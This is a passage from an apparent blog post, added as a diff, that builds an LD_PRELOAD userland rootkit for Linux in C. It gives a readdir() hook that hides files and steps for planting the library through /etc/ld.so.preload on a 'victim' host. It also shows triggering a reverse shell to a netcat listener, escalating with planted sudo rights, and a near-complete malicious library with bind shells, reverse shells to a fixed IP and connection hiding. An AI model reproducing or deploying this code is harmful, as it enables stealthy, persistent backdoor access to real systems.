+               unsigned short d_reclen;    /* Length of this record */
+               unsigned char  d_type;      /* Type of file; not supported
+                                              by all filesystem types */
+               char           d_name[256]; /* Null-terminated filename */
+           }
+</code></pre></div></div>
+
+<p>The only member that is mandatory in the structure is the <code class="language-plaintext highlighter-rouge">d_name</code> which is the null-terminated filename of the entry. That seems pretty easy actually. We can actually key in on this fact, that <code class="language-plaintext highlighter-rouge">d_name</code> is mandatory, and compare its value for entries to a string, such as <code class="language-plaintext highlighter-rouge">rootkit.txt</code> and somehow manipulate the function to skip our entries. Let’s actually do that! Here is our hook for <code class="language-plaintext highlighter-rouge">readdir()</code>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">old_readdir</span><span class="p">)(</span><span class="kt">DIR</span> <span class="o">*</span><span class="n">dir</span><span class="p">);</span>
+<span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="nf">readdir</span><span class="p">(</span><span class="kt">DIR</span> <span class="o">*</span><span class="n">dirp</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">old_readdir</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"readdir"</span><span class="p">);</span>
+
+    <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">dir</span><span class="p">;</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="n">dir</span> <span class="o">=</span> <span class="n">old_readdir</span><span class="p">(</span><span class="n">dirp</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">dir</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span><span class="n">FILENAME</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">dir</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>I got this hook from basically just following the walkthrough on this blog: https://ketansingh.net/overview-on-linux-userland-rootkits/</p>
+
+<p>We can go through it piece by piece:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">struct dirent *(*old_readdir)(DIR *dir);</code> same thing as our hook for <code class="language-plaintext highlighter-rouge">fopen()</code>, we’re declaring a function that will later be initialized to point towards the address of the real <code class="language-plaintext highlighter-rouge">readdir()</code>;</li>
+  <li><code class="language-plaintext highlighter-rouge">struct dirent *readdir(DIR *dirp)</code> we are declaring a function which perfectly matches the definition of the legitimate <code class="language-plaintext highlighter-rouge">readdir()</code> function;</li>
+  <li><code class="language-plaintext highlighter-rouge">old_readdir = dlsym(RTLD_NEXT, "readdir");</code> we are initializing the function we declared so that it points to the real <code class="language-plaintext highlighter-rouge">readdir()</code>;</li>
+  <li><code class="language-plaintext highlighter-rouge">while (dir = old_readdir(dirp))</code> we are saying, while it is true that the legitimate <code class="language-plaintext highlighter-rouge">readdir()</code> is still iterating through directory entries and returning a value, do something;</li>
+  <li><code class="language-plaintext highlighter-rouge">if(strstr(dir-&gt;d_name,FILENAME) == 0) break;</code> we are comparing <code class="language-plaintext highlighter-rouge">FILENAME</code>, which is a definiton, to the <code class="language-plaintext highlighter-rouge">d_name</code> member of the <code class="language-plaintext highlighter-rouge">dir</code> struct returned by our <code class="language-plaintext highlighter-rouge">old_readdir()</code> and if a match is found (that is, a <code class="language-plaintext highlighter-rouge">0</code> is returned), we are <code class="language-plaintext highlighter-rouge">breaking</code> on that entry and skipping over it;</li>
+  <li>finally, we <code class="language-plaintext highlighter-rouge">return dir</code> to complete the function’s called purpose.</li>
+</ul>
+
+<p>With this setup, we can hide arbitrary files from <code class="language-plaintext highlighter-rouge">/bin/ls</code>.</p>
+
+<h2 id="actually-using-the-damn-rootkit">Actually Using the Damn Rootkit</h2>
+<p>Let’s actually use this thing. Let’s pretend we’re root on our victim machine, and it’s time to install the malicious library.</p>
+
+<ol>
+  <li>Let’s set all the definitions specific for the victim host and compile the library. Let’s give it a non-descriptive name, something that will blend in to the naked eye. (And let’s put “man” in the file name because Manteau). Let’s compile our C file with: <code class="language-plaintext highlighter-rouge">gcc  manteau.c -fPIC -shared -D_GNU_SOURCE -o libc.man.so.6 -ldl</code></li>
+  <li>Let’s <code class="language-plaintext highlighter-rouge">wget</code> that to the victim, in our case an i386 Ubuntu machine running SSH.
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ubuntu:/home/manteau# wget http://192.168.1.218/libc.man.so.6
+</code></pre></div>    </div>
+  </li>
+  <li>Let’s move it to the correct library that other shared libaries reside, on our victim that’s in <code class="language-plaintext highlighter-rouge">/lib/i386-linux-gnu/</code>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ubuntu:/home/manteau# mv libc.man.so.6 /lib/i386-linux-gnu/libc.man.so.6
+</code></pre></div>    </div>
+  </li>
+  <li>Let’s now put a reference to our malicious shared library in the <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code> file.
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ubuntu:/home/manteau# echo "/lib/i386-linux-gnu/libc.man.so.6" &gt; /etc/ld.so.preload
+</code></pre></div>    </div>
+  </li>
+  <li>Let’s check that it took by using <code class="language-plaintext highlighter-rouge">ldd</code> on something like <code class="language-plaintext highlighter-rouge">/bin/ls</code> and see if our malicious library is the first shared library loaded into memory.
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ubuntu:/home/manteau# ldd /bin/ls
+ linux-gate.so.1 =&gt;  (0xb7f06000)
+ /lib/i386-linux-gnu/libc.man.so.6 (0xb7efc000)
+ libselinux.so.1 =&gt; /lib/i386-linux-gnu/libselinux.so.1 (0xb7ec0000)
+ libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7d0a000)
+ libdl.so.2 =&gt; /lib/i386-linux-gnu/libdl.so.2 (0xb7d05000)
+ libpcre.so.3 =&gt; /lib/i386-linux-gnu/libpcre.so.3 (0xb7c90000)
+ /lib/ld-linux.so.2 (0xb7f08000)
+ libpthread.so.0 =&gt; /lib/i386-linux-gnu/libpthread.so.0 (0xb7c73000)
+</code></pre></div>    </div>
+  </li>
+  <li>Hell yes. It worked. Ours is the second entry. Let’s restart syslog and then get a connection. We’ll use the trigger for plaintext reverse shell on port 443 on our attacker.
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ubuntu:/home/manteau# systemctl restart ssh
+</code></pre></div>    </div>
+  </li>
+  <li>Start a listener, and send our trigger.
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tokyo:~/LearningC/ # nc -lvp 443 -4                                                                                                      Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on 0.0.0.0:443
+</code></pre></div>    </div>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tokyo:~/LearningC/ # ssh reverseshell4@192.168.1.192               
+reverseshell4@192.168.1.192's password: 
+</code></pre></div>    </div>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tokyo:~/LearningC/ # nc -lvp 443                                   
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 192.168.1.192.
+Ncat: Connection from 192.168.1.192:65065.
+</code></pre></div>    </div>
+  </li>
+  <li>Let’s use our sudo privs we left ourselves and escalate to root real quick
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id
+uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
+sudo su
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div>    </div>
+  </li>
+  <li>Let’s check <code class="language-plaintext highlighter-rouge">netstat</code> for our malicious connection on the victim,
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ubuntu:/home/manteau# netstat -ano | grep -v unix
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
+udp        0      0 127.0.1.1:53            0.0.0.0:*                           off (0.00/0/0)
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           off (0.00/0/0)
+udp        0      0 0.0.0.0:631             0.0.0.0:*                           off (0.00/0/0)
+udp        0      0 0.0.0.0:43212           0.0.0.0:*                           off (0.00/0/0)
+udp        0      0 0.0.0.0:5353            0.0.0.0:*                           off (0.00/0/0)
+udp        0      0 0.0.0.0:33102           0.0.0.0:*                           off (0.00/0/0)
+udp6       0      0 :::52795                :::*                                off (0.00/0/0)
+udp6       0      0 :::5353                 :::*                                off (0.00/0/0)
+raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
+Active UNIX domain sockets (servers and established)
+Proto RefCnt Flags       Type       State         I-Node   Path
+</code></pre></div>    </div>
+  </li>
+  <li>Awesome. Our connection on local port <code class="language-plaintext highlighter-rouge">65065</code> is not shown. Let’s try looking in <code class="language-plaintext highlighter-rouge">/etc</code> for <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code> which was the file I chose to hide.
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ubuntu:/home/manteau# ls -lah /etc
+-----snip-----
+-rw-r--r--   1 root root    110 Feb 20  2019 kernel-img.conf
+-rw-r--r--   1 root root   1.3K Mar 10  2016 kerneloops.conf
+drwxr-xr-x   2 root root   4.0K Sep 22 06:46 ldap
+-rw-r--r--   1 root root    88K Oct  1 18:40 ld.so.cache
+-rw-r--r--   1 root root     34 Jan 27  2016 ld.so.conf
+drwxr-xr-x   2 root root   4.0K Jun  1 12:18 ld.so.conf.d
+-rw-r--r--   1 root root    267 Oct 22  2015 legal
+-rw-r--r--   1 root root     27 Jan  7  2015 libao.conf
+-rw-r--r--   1 root root    191 Jan 18  2016 libaudit.conf
+-----snip-----
+</code></pre></div>    </div>
+  </li>
+  <li>Finally, <code class="language-plaintext highlighter-rouge">/etc/ld.so.preload</code> is hidden and this is good because I think on most systems it wouldn’t exist.</li>
+</ol>
+
+<h2 id="potential-upgrades-for-the-library">Potential Upgrades for the Library</h2>
+<p>If you liked this post, and you want to take the library further, I have some ideas on what can be improved:</p>
+<ul>
+  <li>Get rid of the <code class="language-plaintext highlighter-rouge">syslog</code> trigger, and develop a trigger for the <code class="language-plaintext highlighter-rouge">sshd</code> service itself, that way we can get on the box as root without any privesc bread crumbs</li>
+  <li>Code up an <code class="language-plaintext highlighter-rouge">openssl</code> back connect client/server program so we can get encrypted comms</li>
+  <li>Do away with the magic port number hook and instead implement a magic <code class="language-plaintext highlighter-rouge">GID</code> which you can set as root on the processes you run</li>
+  <li>Extra Bonus: Patch the dynamic linker so that it doesn’t reference /etc/ld.so.preload but silently references a different directory which you have hidden. The dynamic linker should still report that it checks /etc/ld.so.preload but we will know better :)</li>
+</ul>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>With some creative thinking and copy/paste, we were able to do quite a lot of bad things with some simple C. A lot of systems programming is done in C. If we want to get good at binary exploitation, reverse engineering, vulnerability research, etc., we’re going to have to be comfortable with C.</p>
+
+<p>Outside of my solution for hiding from <code class="language-plaintext highlighter-rouge">netstat</code>, a lot of these ideas have been done before and I leaned heavily on reference material. I’ll include a resources section at the bottom.</p>
+
+<h2 id="complete-malicious-library">Complete Malicious Library</h2>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;dirent.h&gt;
+#include &lt;arpa/inet.h&gt;
+</span><span class="c1">//bind-shell definitions</span>
+<span class="cp">#define KEY_4 "notavaliduser4"
+#define KEY_6 "notavaliduser6"
+#define PASS "areallysecurepassword1234!@#$"
+#define LOC_PORT 65065
+</span><span class="c1">//reverse-shell definitions</span>
+<span class="cp">#define KEY_R_4 "reverseshell4"
+#define KEY_R_6 "reverseshell6"
+#define REM_HOST4 "192.168.1.217"
+#define REM_HOST6 "::1"
+#define REM_PORT 443
+</span><span class="c1">//filename to hide</span>
+<span class="cp">#define FILENAME "ld.so.preload"
+</span><span class="c1">//hex represenation of port to hide for /proc/net/tcp reads</span>
+<span class="cp">#define KEY_PORT "FE29"
+</span>
+<span class="kt">int</span> <span class="nf">ipv6_bind</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">sockaddr_in6</span> <span class="n">addr</span><span class="p">;</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin6_family</span> <span class="o">=</span> <span class="n">AF_INET6</span><span class="p">;</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin6_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">LOC_PORT</span><span class="p">);</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin6_addr</span> <span class="o">=</span> <span class="n">in6addr_any</span><span class="p">;</span>
+
+    <span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="k">const</span> <span class="k">static</span> <span class="kt">int</span> <span class="n">optval</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+    <span class="n">setsockopt</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">IPPROTO_IPV6</span><span class="p">,</span> <span class="n">IPV6_V6ONLY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">optval</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">optval</span><span class="p">));</span>
+
+    <span class="n">setsockopt</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">optval</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">optval</span><span class="p">));</span>
+
+    <span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
+
+    <span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">new_sockfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">count</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">dup2</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
+
+    <span class="n">read</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">input</span><span class="p">));</span>
+    <span class="n">input</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="n">PASS</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> 
+    <span class="p">{</span>
+        <span class="n">shutdown</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span> <span class="n">SHUT_RDWR</span><span class="p">);</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">ipv4_bind</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">addr</span><span class="p">;</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">LOC_PORT</span><span class="p">);</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
+
+    <span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="k">const</span> <span class="k">static</span> <span class="kt">int</span> <span class="n">optval</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+    <span class="n">setsockopt</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">optval</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">optval</span><span class="p">));</span>
+
+    <span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
+
+    <span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">new_sockfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">count</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">dup2</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
+
+    <span class="n">read</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">input</span><span class="p">));</span>
+    <span class="n">input</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="n">PASS</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> 
+    <span class="p">{</span>
+        <span class="n">shutdown</span><span class="p">(</span><span class="n">new_sockfd</span><span class="p">,</span> <span class="n">SHUT_RDWR</span><span class="p">);</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">ipv6_rev</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">host</span> <span class="o">=</span> <span class="n">REM_HOST6</span><span class="p">;</span>
+
+    <span class="k">struct</span> <span class="n">sockaddr_in6</span> <span class="n">addr</span><span class="p">;</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin6_family</span> <span class="o">=</span> <span class="n">AF_INET6</span><span class="p">;</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin6_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">REM_PORT</span><span class="p">);</span>
+    <span class="n">inet_pton</span><span class="p">(</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">.</span><span class="n">sin6_addr</span><span class="p">);</span>
+
+    <span class="k">struct</span> <span class="n">sockaddr_in6</span> <span class="n">client</span><span class="p">;</span>
+    <span class="n">client</span><span class="p">.</span><span class="n">sin6_family</span> <span class="o">=</span> <span class="n">AF_INET6</span><span class="p">;</span>
+    <span class="n">client</span><span class="p">.</span><span class="n">sin6_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">LOC_PORT</span><span class="p">);</span>
+    <span class="n">client</span><span class="p">.</span><span class="n">sin6_addr</span> <span class="o">=</span> <span class="n">in6addr_any</span><span class="p">;</span>
+
+    <span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">client</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">client</span><span class="p">));</span>
+
+    <span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">count</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">dup2</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">ipv4_rev</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">host</span> <span class="o">=</span> <span class="n">REM_HOST4</span><span class="p">;</span>
+
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">addr</span><span class="p">;</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">REM_PORT</span><span class="p">);</span>
+    <span class="n">inet_aton</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">);</span>
+
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">client</span><span class="p">;</span>
+    <span class="n">client</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">client</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">LOC_PORT</span><span class="p">);</span>
+    <span class="n">client</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
+
+    <span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">client</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">client</span><span class="p">));</span>
+
+    <span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">addr</span><span class="p">));</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">count</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">dup2</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">ssize_t</span> <span class="nf">write</span><span class="p">(</span><span class="kt">int</span> <span class="n">fildes</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nbytes</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">ssize_t</span> <span class="p">(</span><span class="o">*</span><span class="n">new_write</span><span class="p">)(</span><span class="kt">int</span> <span class="n">fildes</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nbytes</span><span class="p">);</span>
+
+    <span class="kt">ssize_t</span> <span class="n">result</span><span class="p">;</span>
+
+    <span class="n">new_write</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"write"</span><span class="p">);</span>
+
+
+    <span class="kt">char</span> <span class="o">*</span><span class="n">bind4</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">KEY_4</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">bind6</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">KEY_6</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">rev4</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">KEY_R_4</span><span class="p">);</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">rev6</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">KEY_R_6</span><span class="p">);</span>
+
